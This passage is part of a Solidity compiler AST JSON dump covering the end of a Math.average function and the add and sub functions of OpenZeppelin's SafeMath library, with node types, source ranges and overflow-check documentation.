													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 212,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 206,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 204,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 197,
																		"src": "751:1:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 205,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "755:1:1",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "751:5:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 207,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "750:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "+",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 210,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 208,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 199,
																		"src": "761:1:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 209,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "765:1:1",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "761:5:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 211,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "760:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "750:17:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 222,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 219,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 215,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 213,
																					"name": "a",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 197,
																					"src": "772:1:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "%",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 214,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "776:1:1",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "772:5:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 218,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 216,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 199,
																					"src": "780:1:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "%",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 217,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "784:1:1",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "780:5:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "772:13:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"id": 220,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "771:15:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "32",
																	"id": 221,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "789:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_2_by_1",
																		"typeString": "int_const 2"
																	},
																	"value": "2"
																},
																"src": "771:19:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"id": 223,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "770:21:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "750:41:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 203,
												"id": 225,
												"nodeType": "Return",
												"src": "743:48:1"
											}
										]
									},
									"documentation": {
										"id": 195,
										"nodeType": "StructuredDocumentation",
										"src": "501:102:1",
										"text": " @dev Returns the average of two numbers. The result is rounded towards\n zero."
									},
									"id": 227,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "average",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 200,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 197,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 227,
												"src": "625:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 196,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "625:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 199,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 227,
												"src": "636:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 198,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "636:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "624:22:1"
									},
									"returnParameters": {
										"id": 203,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 202,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 227,
												"src": "670:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 201,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "670:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "669:9:1"
									},
									"scope": 228,
									"src": "608:190:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 229,
							"src": "132:668:1"
						}
					],
					"src": "33:768:1"
				},
				"id": 1
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol": {
				"ast": {
					"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							424
						]
					},
					"id": 425,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 230,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:2"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 231,
								"nodeType": "StructuredDocumentation",
								"src": "58:563:2",
								"text": " @dev Wrappers over Solidity's arithmetic operations with added overflow\n checks.\n Arithmetic operations in Solidity wrap on overflow. This can easily result\n in bugs, because programmers usually assume that an overflow raises an\n error, which is the standard behavior in high level programming languages.\n `SafeMath` restores this intuition by reverting the transaction when an\n operation overflows.\n Using this library instead of the unchecked operations eliminates an entire\n class of bugs, so it's recommended to use it always."
							},
							"fullyImplemented": true,
							"id": 424,
							"linearizedBaseContracts": [
								424
							],
							"name": "SafeMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 256,
										"nodeType": "Block",
										"src": "934:109:2",
										"statements": [
											{
												"assignments": [
													242
												],
												"declarations": [
													{
														"constant": false,
														"id": 242,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 256,
														"src": "944:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 241,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "944:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 246,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 245,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 243,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 234,
														"src": "956:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 244,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 236,
														"src": "960:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "956:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "944:17:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 250,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 248,
																"name": "c",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 242,
																"src": "979:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 249,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 234,
																"src": "984:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "979:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206164646974696f6e206f766572666c6f77",
															"id": 251,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "987:29:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															},
															"value": "SafeMath: addition overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															}
														],
														"id": 247,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "971:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 252,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "971:46:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 253,
												"nodeType": "ExpressionStatement",
												"src": "971:46:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 254,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 242,
													"src": "1035:1:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 240,
												"id": 255,
												"nodeType": "Return",
												"src": "1028:8:2"
											}
										]
									},
									"documentation": {
										"id": 232,
										"nodeType": "StructuredDocumentation",
										"src": "645:217:2",
										"text": " @dev Returns the addition of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `+` operator.\n Requirements:\n - Addition cannot overflow."
									},
									"id": 257,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 237,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 234,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 257,
												"src": "880:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 233,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "880:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 236,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 257,
												"src": "891:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 235,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "891:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "879:22:2"
									},
									"returnParameters": {
										"id": 240,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 239,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 257,
												"src": "925:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 238,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "925:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "924:9:2"
									},
									"scope": 424,
									"src": "867:176:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 273,
										"nodeType": "Block",
										"src": "1374:67:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 268,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 260,
															"src": "1395:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 269,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 262,
															"src": "1398:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a207375627472616374696f6e206f766572666c6f77",
															"id": 270,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1401:32:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															},
															"value": "SafeMath: subtraction overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															}
														],
														"id": 267,
														"name": "sub",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															274,
															302
														],
														"referencedDeclaration": 302,
														"src": "1391:3:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 271,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1391:43:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 266,
												"id": 272,
												"nodeType": "Return",
												"src": "1384:50:2"
											}
										]
									},
									"documentation": {
										"id": 258,
										"nodeType": "StructuredDocumentation",
										"src": "1049:253:2",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting on\n overflow (when the result is negative).\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 274,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 263,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 260,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 274,
												"src": "1320:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 259,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1320:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 262,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 274,
												"src": "1331:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 261,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1331:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1319:22:2"
									},
									"returnParameters": {
										"id": 266,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 265,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 274,
												"src": "1365:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 264,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1365:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1364:9:2"
									},
									"scope": 424,
									"src": "1307:134:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 301,
										"nodeType": "Block",
										"src": "1820:92:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 289,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 287,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 279,
																"src": "1838:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 288,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 277,
																"src": "1843:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1838:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 290,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 281,
															"src": "1846:12:2",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 286,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "1830:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 291,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1830:29:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 292,
												"nodeType": "ExpressionStatement",
												"src": "1830:29:2"
											},
											{
												"assignments": [
													294
												],
												"declarations": [
													{
														"constant": false,
														"id": 294,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 301,
														"src": "1869:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 293,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1869:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 298,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 297,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 295,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 277,
														"src": "1881:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 296,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 279,
														"src": "1885:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1881:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1869:17:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 299,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 294,
													"src": "1904:1:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 285,
												"id": 300,
												"nodeType": "Return",
												"src": "1897:8:2"
											}
										]
									},
									"documentation": {
										"id": 275,
										"nodeType": "StructuredDocumentation",
										"src": "1447:273:2",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n overflow (when the result is negative).\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 302,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 282,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 277,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 302,
												"src": "1738:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 276,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1738:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 279,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 302,
												"src": "1749:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 278,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1749:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 281,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 302,
												"src": "1760:26:2",
